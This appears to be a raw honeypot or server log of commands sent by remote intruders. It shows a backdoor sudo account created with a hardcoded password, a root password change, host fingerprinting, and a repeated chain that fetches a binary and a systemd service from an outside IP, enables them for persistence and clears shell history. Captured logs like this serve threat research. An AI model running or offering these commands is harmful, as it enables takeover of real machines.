2024-11-19 19:02:59.170216 - ('80.238.125.174', 41466) - certutil.exe
2024-11-19 19:59:49.884729 - ('46.19.143.66', 54066) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Huufq8pF) system && sudo usermod -aG sudo system
2024-11-19 19:59:50.641205 - ('46.19.143.66', 54066) - lscpu && echo -e "Huufq8pF\nHuufq8pF" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-20 02:36:03.501566 - ('195.178.110.6', 53088) - apt
2024-11-20 02:36:04.317490 - ('195.178.110.6', 53088) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-20 02:36:06.604577 - ('195.178.110.6', 53110) - apt
2024-11-20 02:36:07.427749 - ('195.178.110.6', 53110) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-20 02:36:09.475480 - ('195.178.110.6', 53138) - apt
2024-11-20 02:36:10.305991 - ('195.178.110.6', 53138) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-20 02:36:12.494008 - ('195.178.110.6', 53160) - apt
